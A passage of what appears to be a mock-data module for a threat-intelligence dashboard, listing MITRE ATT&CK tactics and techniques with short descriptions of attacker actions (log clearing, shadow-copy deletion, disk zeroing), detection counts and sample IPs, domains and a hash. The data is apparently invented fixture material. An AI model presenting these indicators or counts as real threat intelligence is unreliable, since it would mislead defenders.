        description: 'Obfuscated Base64 PowerShell execution with AMSI bypass headers.',
        detectedCount: 29,
        associatedIoCs: ['synch-update-cloud.com']
      }
    ]
  },
  {
    tacticId: 'TA0003',
    tacticName: 'Persistence',
    description: 'Adversary attempting to keep access across reboots or credential rotation.',
    techniques: [
      {
        id: 'T1053.005',
        name: 'Scheduled Task / Cron Job',
        description: 'Scheduled task injection referencing remote DLL or Linux init scripts.',
        detectedCount: 19,
        associatedIoCs: ['194.26.29.114', 'synch-update-cloud.com']
      }
    ]
  },
  {
    tacticId: 'TA0005',
    tacticName: 'Defense Evasion',
    description: 'Adversary attempting to avoid detection by security analysts or SIEM.',
    techniques: [
      {
        id: 'T1070.003',
        name: 'Indicator Removal: Clear Command History',
        description: 'Deletion of .bash_history, /var/log/wtmp, and Windows Event logs.',
        detectedCount: 42,
        associatedIoCs: ['194.26.29.114', '91.240.118.66']
      },
      {
        id: 'T1568.001',
        name: 'Dynamic Resolution: Fast Flux DNS',
        description: 'Rapid rotation of A-records across bulletproof proxy ASNs to prevent IP blacklisting.',
        detectedCount: 22,
        associatedIoCs: ['synch-update-cloud.com']
      }
    ]
  },
  {
    tacticId: 'TA0011',
    tacticName: 'Command and Control',
    description: 'Adversary communicating with systems under their control.',
    techniques: [
      {
        id: 'T1071.001',
        name: 'Application Layer Protocol: Web Protocols',
        description: 'Periodic HTTPS beaconing mimicking legitimate cloud telemetry.',
        detectedCount: 57,
        associatedIoCs: ['194.26.29.114', 'synch-update-cloud.com']
      },
      {
        id: 'T1048.003',
        name: 'Protocol Tunneling: DNS Over HTTPS',
        description: 'High-entropy TXT records employed as covert bidirectional data channel.',
        detectedCount: 14,
        associatedIoCs: ['dns-over-https-cloudflare.xyz']
      }
    ]
  },
  {
    tacticId: 'TA0040',
    tacticName: 'Impact',
    description: 'Adversary attempting to manipulate, interrupt, or destroy systems and data.',
    techniques: [
      {
        id: 'T1490',
        name: 'Inhibit System Recovery',
        description: 'Deletion of volume shadow copies via vssadmin and wbadmin to force extortion.',
        detectedCount: 12,
        associatedIoCs: ['91.240.118.66']
      },
      {
        id: 'T1485',
        name: 'Data Destruction',
        description: 'Targeted zeroing of raw disk devices (/dev/sda) in industrial controller emulation.',
        detectedCount: 7,
        associatedIoCs: ['7b9c31fa7d8893d2567f2931ea454c7d812bf087e8346129845763261a8ef141']
      }
    ]
  }
];

export const MOCK_THREAT_FEED = MOCK_THREAT_FEED_ITEMS;
export const MOCK_MITRE_TACTICS = MOCK_MITRE_TACTIC_GROUPS;

